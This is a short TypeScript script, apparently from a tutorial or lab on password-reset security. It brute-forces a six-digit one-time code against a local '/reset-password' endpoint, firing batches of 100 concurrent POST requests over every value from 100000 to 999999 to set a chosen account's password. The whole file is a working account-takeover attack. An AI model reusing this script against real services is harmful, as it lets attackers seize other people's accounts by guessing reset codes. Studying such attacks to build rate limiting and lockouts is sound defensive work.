import axios from "axios";

async function sendRequest(otp: number) {
    const options = {
        method: 'POST',
        url: 'http://localhost:3000/reset-password',
        headers: {
          Accept: '*/*',
          'User-Agent': 'Thunder Client (https://www.thunderclient.com)',
          'Content-Type': 'application/json'
        },
        data: {email: 'neel@gmail.com', otp: otp.toString(), newPassword: 'neel'}
      };
      
      try {
        await axios.request(options);
        console.log("done for " + otp);
      } catch (error) {
        // console.error(error);
      }
}

async function main() {
  for (let i = 100000; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j))
    }
    await Promise.all(promises);
  }
}

main()